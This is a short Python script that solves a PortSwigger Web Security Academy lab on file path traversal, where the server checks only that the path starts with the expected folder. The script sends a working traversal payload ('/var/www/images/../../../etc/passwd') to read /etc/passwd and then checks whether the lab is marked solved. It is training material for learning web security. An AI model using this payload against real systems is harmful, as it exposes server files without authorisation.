#!/usr/bin/env python

'''This lab contains a file path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file.

Lab link: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
'''
import requests


lab_id = '0a8600e9040e2625847a286b0089007f' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/"  


payload = 'image?filename=/var/www/images/../../../etc/passwd' # directory traversal payload, exploit the image endpoint by using the 'filename' parameter

r1 = requests.get(uri + payload)
print(r1.text)

# reload page to trigger success flag
r2 = requests.get(uri)
if 'Solved' in r2.text:
    print('solved')
else:
    print('nope')